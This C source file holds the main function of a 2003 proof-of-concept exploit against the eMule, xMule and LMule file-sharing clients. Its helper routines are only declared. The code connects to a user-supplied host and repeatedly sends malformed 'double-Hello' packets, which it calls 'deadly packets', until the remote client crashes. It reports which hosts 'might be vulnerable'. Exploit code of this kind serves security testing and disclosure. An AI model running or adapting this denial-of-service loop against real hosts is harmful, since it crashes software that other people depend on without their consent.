
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int MAXTRIES ;
 int close (int) ;
 int fprintf (int ,char*,char const*) ;
 int gai_perror (char const*) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int puts (char*) ;
 scalar_t__ recv_hello (int) ;
 scalar_t__ send_2hello (int) ;
 int socket_connect (char const*,char const*) ;
 int stderr ;
 int usage (char*) ;

int
main (int argc, char *argv[])
{
 puts ("eMule/xMule/LMule AttachToAlreadyKnown() "
   "Object Destruction vulnerability\n"
  "proof of concept code\n"
  "Copyright (C) 2003 Rï¿½mi Denis-Courmont "
   "<exploit@simutrans.fr.st>\n");
 if (argc < 2)
  return usage (argv[0]);
 else
 {
  int fd, count = 0;
  const char *host, *port;

  host = argv[1];
  port = (argc < 3) ? "4662" : argv[2];
  printf ("Connecting to [%s]:%s ...\n", host, port);
  while (++count && ((fd = socket_connect (host, port)) != -1))
  {
   printf ("Sending double-Hello packet (%d)...\n",
     count);
   if (send_2hello (fd))
   {
    perror ("Error");
    count = -1;
   }

   puts ("Checking reply ...");
   if (recv_hello (fd))
   {
    fprintf (stderr, "%s: malformed reply\n",
      host);
    count = -1;
   }
   else if (recv_hello (fd))
    printf ("%s might be vulnerable.\n", host);
   else
   {
    printf ("%s is not vulnerable.\n", host);
    count = -1;
   }
   close (fd);

   if (count >= MAXTRIES)
   {
    printf ("%s is still alive after %d deadly "
     "packets. Probably not vulnerable.\n",
     host, count);
    return 0;
   }
  }

  gai_perror (host);
  if (count)
  {
   puts ("Remote host seems to have crashed!");
   return 0;
  }
 }

 return 1;
}
